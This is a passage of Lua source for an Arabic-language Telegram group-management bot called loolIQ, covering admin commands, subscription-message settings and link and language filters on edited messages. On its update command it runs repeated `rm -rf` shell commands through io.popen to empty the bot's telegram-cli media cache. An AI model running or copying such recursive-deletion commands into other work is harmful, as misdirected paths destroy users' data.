Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🔑 ⌯ تـۖم ٱڵتـۧحډيث ٱڵى ٱلٱصدٱر ٱڵجډيـډ', 1, 'md') 
dofile('loolIQ.lua') 
io.popen("rm -rf ~/.telegram-cli/data/audio/*")
io.popen("rm -rf ~/.telegram-cli/data/document/*")
io.popen("rm -rf ~/.telegram-cli/data/photo/*")
io.popen("rm -rf ~/.telegram-cli/data/sticker/*")
io.popen("rm -rf ~/.telegram-cli/data/temp/*")
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*")
io.popen("rm -rf ~/.telegram-cli/data/voice/*")
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
end 
if text == 'تحديث' and is_leader(msg) then  
dofile('loolIQ.lua')  io.popen("rm -rf ~/.telegram-cli/data/audio/*") 
io.popen("rm -rf ~/.telegram-cli/data/document/*") 
io.popen("rm -rf ~/.telegram-cli/data/photo/*") 
io.popen("rm -rf ~/.telegram-cli/data/sticker/*") 
io.popen("rm -rf ~/.telegram-cli/data/temp/*") 
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*") 
io.popen("rm -rf ~/.telegram-cli/data/voice/*") 
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n          ( تم تحديث البوت )          \n\27[0;34;49m\n") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم تـۧـحـډيـث ٱڵـبـۄت", 1, "md")
end 
--     Source loolIQ     --
if text and text:match("^اضف رسائل (%d+)$") and is_monshid(msg.sender_user_id_, msg.chat_id_) then  
DevAbs0 = text:match("^اضف رسائل (%d+)$")
DevAbs:set('ABS_PROX:'..bot_id..'id:user'..msg.chat_id_,DevAbs0)  
DevAbs:setex('ABS_PROX:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱرسـڵ عـدد ٱڵـرسٱئـڵ ٱلٱن \n❗️🔑 ⌯ ٱرسـڵ ٱڵغٱء لٱڵغٱء ٱلٱمر ", 1, "md")
Dev_Abs(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
end 
--     Source loolIQ     --
if is_leader(msg) then
local text = msg.content_.text_:gsub("[Ss]etprice", "Setnerkh")
if text:match("^[Ss]etnerkh$") or text:match("^ضع كليشه المطور$") or text:match("^وضع كليشه المطور$") or text:match("^تغيير كليشه المطور$") then
if DevAbs:get(loolIQ.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 Plese Send your sudo list now ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱرسـڵ كڵيشة ٱڵـمطور ٱلٱن ", 1, "md")
end
DevAbs:setex(loolIQ.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 100, true)
end end
--     Source loolIQ     --
if DevAbs:get(loolIQ.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️📛 ⌯ تـۖم ٱڵغاء ٱلٱمر", 1, "md") 
DevAbs:del(loolIQ.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevAbs:del(loolIQ.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevAbs:set(loolIQ..'bot:textch:user',texxt)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم تغيير كڵيشة ٱلٱشترٱك ٱلٱجبٱري', 1, 'md')
end
if text and text:match("^تغيير كليشه الاشتراك الاجباري$") or text:match("^تغيير كليشه الاشتراك$") and is_leader(msg) then  
DevAbs:setex(loolIQ.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
local text = '❗️🚸 ⌯ حسنٱ ٱرسڵ كڵيشة ٱلٱشترٱك ٱڵجديدة'  
Dev_Abs(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "حذف كليشه الاشتراك الاجباري" or text == "حذف كليشه الاشتراك" and is_leader(msg) then  
DevAbs:del(loolIQ..'bot:textch:user')
textt = "❗️🚸 ⌯ تـۖم حذف كڵيشة ٱلٱشترٱك ٱلٱجبٱري"
Dev_Abs(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end
if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاشتراك' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
local chtext = DevAbs:get(loolIQ.."bot:textch:user")
if chtext then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ كڵيشة ٱلٱشترٱك ٱلٱجبٱري : \n〰️➖〰️➖〰️➖〰️➖〰️\n['..chtext..']', 1, 'md')
else
local DevAbs6 = DevAbs:get(loolIQ.."DevAbs3")
if DevAbs6 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🔅 ⌯ هذه معٱينه ڵكڵيشة ٱڵسورس \n❗️📯 ⌯ ڵتغيير ٱڵكڵيشة ٱرسڵ \n❗️📒 ⌯ { تغيير كليشه الاشتراك } \n〰️➖〰️➖〰️➖〰️➖〰️\n❗️🚸 ⌯ عذرٱ لٱيمكنك ٱستخدٱم ٱڵبوت \n❗️🔑 ⌯ رجائٱ ٱشترك في قنٱة ٱڵبوت \n❗️🎗 ⌯ ڵتتمكن من ٱستخدٱمه \n❗️📣 ⌯ ٱڵقنٱت ⌯» { ['..DevAbs6..'] }', 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ڵم يتم تعيين قنٱة ٱلٱشترٱك ٱلٱجبٱري \n❗️🔑 ⌯ ٱرسڵ (تعيين قناة الاشتراك) ڵڵتعيين ', 1, 'md')
end end end end
--     Source loolIQ     --
if text:match("^القناة$") or text:match("^قناة السورس$") or text:match("^قنات السورس$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, 'Ξ ❗️🚸 • قـنـاة الـسـورس • \nΞ ❕🚸 • @loolIQ • \n ', 1, 'md')    
end end
--     Source loolIQ     --
if tonumber(msg.sender_user_id_) == tonumber(bot_owner) then 
if (msg.content_.text_ == 'stats server' or msg.content_.text_ == 'السيرفر') then 
local ABS_PROX = '🔎 ⌯ لقد مضى على تشغيل السيرفر :\n' 
  local DevAbs1 = DevAbs:info()
  ABS_PROX = ABS_PROX..'📌 ⌯ الايام : *('..DevAbs1.server.uptime_in_days..')*\n📌 ⌯ الثواني : *('..DevAbs1.server.uptime_in_seconds..')* \n '
  Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
end
if is_owner(msg.sender_user_id_, msg.chat_id_) and not Abbas_Abs(msg) or is_monsh(msg.sender_user_id_, msg.chat_id_) and not Abbas_Abs(msg) or is_sudo(msg) and not Abbas_Abs(msg) or is_leader(msg) and not Abbas_Abs(msg) or is_sudo3(msg.sender_user_id_) and not Abbas_Abs(msg) or is_admin(msg.sender_user_id_, msg.chat_id_) and not Abbas_Abs(msg) or is_vipmem(msg.sender_user_id_, msg.chat_id_) and not Abbas_Abs(msg)  then
return false
end
end   
--     Source loolIQ     --
--        end code        --
--     Source loolIQ     --
elseif (data.ID == "UpdateChat") then
chat = data.chat_
chats[chat.id_] = chat
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
function get_msg_contact(extra, result, success)
local text = (result.content_.text_ or result.content_.caption_)
if result.id_ and result.content_.text_ then
DevAbs:set(loolIQ..'bot:editid'..result.id_,result.content_.text_)
end 
if not is_vipmem(result.sender_user_id_, result.chat_id_) then
check_filter_words(result, text)
if DevAbs:get(loolIQ..'editmsg'..msg.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end
--     Source loolIQ     --
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if DevAbs:get(loolIQ..'bot:links:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match("/") then
if DevAbs:get(loolIQ..'bot:webpage:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("@") then
if DevAbs:get(loolIQ..'tags:lock'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("#") then 
if DevAbs:get(loolIQ..'bot:abstag:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[\216-\219][\128-\191]") then
if DevAbs:get(loolIQ..'bot:arabic:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[A-Z]") or text:match("[a-z]") then
if DevAbs:get(loolIQ..'bot:english:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end end end
getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
--     Source loolIQ     --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
end
--     Source loolIQ     --
end 
------------------------------------------------
-- This Source Was Developed By (ABS) @IQ_ABS.--
--   This Is The Source Channel @loolIQ .   --
--                - loolIQ -                 --
--        -- https://t.me/loolIQ --         --
------------------------------------------------ 
